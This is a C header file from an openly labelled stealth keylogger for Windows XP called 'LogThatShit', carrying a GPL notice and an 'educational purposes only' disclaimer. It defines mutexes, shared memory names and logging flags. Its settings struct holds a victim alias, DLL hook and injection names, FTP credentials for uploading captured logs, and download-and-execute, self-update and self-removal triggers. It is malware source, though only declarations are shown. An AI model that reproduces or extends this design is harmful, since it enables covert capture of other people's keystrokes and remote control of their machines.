
// LogThatShit 
//		A stealthly keylogger designed on and for Windows XP 
//		By Isam M. <r0cket(NO_SPAM)jump@yahoo.com> 
//    http://biodegradablegeek.com

// This software file (the "File") is distributed under the terms of the 
// GNU General Public License Version 3, (the "License"). You may use, 
// redistribute and/or modify this File in accordance with the terms and 
// conditions of the License, a copy of which is available along with the 
// File in the license.txt file or by writing to 
//  Free Software Foundation, Inc., 
//  59 Temple Place, 
//  Suite 330, Boston, MA, 02111-1307 
//  
//  or on the Internet at http://www.gnu.org/licenses/gpl.txt.

// THE FILE IS DISTRIBUTED AS-IS, WITHOUT WARRANTY OF ANY KIND. THE AUTHOR 
// DOES NOT TAKE ANY RESPONSIBILITY FOR ANY DAMAGE OR LEGAL ISSUES YOU MAY 
// FACE WHEN USING THIS APPLICATION. PLEASE NOTE THAT LTS WAS WRITTEN AND 
// RELEASED FOR *EDUCATIONAL* PURPOSES ONLY AND IS NOT INTENDED TO BE USED 
// FOR ANYTHING THAT MAY BE AGAINST THE LAW WHERE YOU LIVE. IF YOU DO NOT 
// WANT THAT RESPONSIBILITY, PLEASE DONT COMPILE OR USE THIS APPLICATION.




#ifndef LOG_THAT_SHIT_COMMON_H_ 
#define LOG_THAT_SHIT_COMMON_H_ 


#include <windows.h> 

#ifdef DEBUG_MODE 
	#define INFO(msg) MessageBox(0, msg, "iNFO", MB_OK|MB_ICONINFORMATION); 
	#define GEN_ERR(msg) MessageBox(0, msg, "Flow error", MB_OK|MB_ICONERROR); 
	#define WIN_ERR(msg) E(msg); 
	#define WIE_ERR(msg) WIE(msg); 
	#define MUTEX_WAIT_MS INFINITE 
	void E(const char* const); 
	void WIE(const char* const); 
#else 
	#define INFO(msg) ; 
	#define GEN_ERR(msg) ; 
	#define WIN_ERR(msg) ; 
	#define WIE_ERR(msg) ; 
	#define MUTEX_WAIT_MS INFINITE /* XXX = Change to 500MS? */ 
#endif 


#define MUTEX_NAME_LOG ".lts_ControlOfLog" 
#define MUTEX_NAME_STATUS ".lts_ControlOfStatus" 
#define MUTEX_NAME_FTP ".lts_ControlOfFTP" 
#define MUTEX_NAME_REMOVE ".lts_ControlOfRemove" 
#define MUTEX_NAME_RUNNING ".lts_AlreadyRunning" 
#define MUTEX_NAME_DONE ".lts_DoneReadingSettings"

#define LTS_MMBUF_LOGFILE ".lts_mmb_LogFile" 
#define LTS_MMBUF_STATUS ".lts_mmb_Status" 
#define LTS_MMBUF_FLAGS ".lts_mmb_Flags" 
#define LTS_MMBUF_BLOCK ".lts_mmb_Block" 
#define LTS_MMBUF_BLOCK_SZ ".lts_mmb_Blocksz" 
#define LTS_DATA_SEG_NAME ".lts_mmb" 


#define LogFocusTitle 1	/* Log the window title that is getting the key strokes. */ 
#define LogTitleChange 2 /* Puts an asterisk in the log next to the title if it changes. */ 
#define LogFocusPath 4	/* Log file path of the current window getting key strokes. */ 
#define LogFocusTimeStamp 8 /* Log the time focus changed to different window. */ 


/*	The above defines get ORd into this. HookProc will read this to see what it should log. */ 
typedef int LTSFlags; 

/* A bunch of identifiers for the current log's status.  */ 
typedef enum LogStatus_ {NO_CHANGE, MAX_SZ, INITIAL_LOG} LogStatus; 

/* Holds settings. Data block is parsed out and then this struct is filled in for easier access. */ 
typedef struct LTSSettings_ { 
	char* alias; /* Alias of the victim. */ 
	char* path; /* Path to where everything will be stored. */ 
	char* logname; /* Log filename. */ 
	char* filename;	/* Our own filename. */ 
	char* hookname;	/* Name of the DLL with HookProc. */ 
	char* injectname;	/* Name of the inject DLL. */ 

	/* Auto-file settings */ 
	char* exec; /* If we find this, download and execute it. */ 
	char* remove; /* If we find this, remove ourself from the victim's box. */ 
	char* update; /* If we find this, DL it and update ourselves. */ 

	/* Log preferences */ 
	unsigned int maxlogsize; 
	unsigned int logcheckint; 

	/* FTP settings */ 
	int ftpport; 
	char* ftproot; 
	char* ftphost; 
	char* ftpuser; 
	char* ftppass; 
} LTSSettings; 


/*	This is the last thing appended to the exec. It holds the sizes that we use to 
	find the offset of where each item is in the exec. */ 
typedef struct LTSData_ { 
	LTSFlags flags; 
	unsigned int injectsz; 
	unsigned int hooksz; 
	unsigned int blocksz; 
} LTSData; 


HANDLE WaitForMutex(const char* const, DWORD); 
int strcmpi2(const char* const, const char* const, unsigned int); 

#endif 


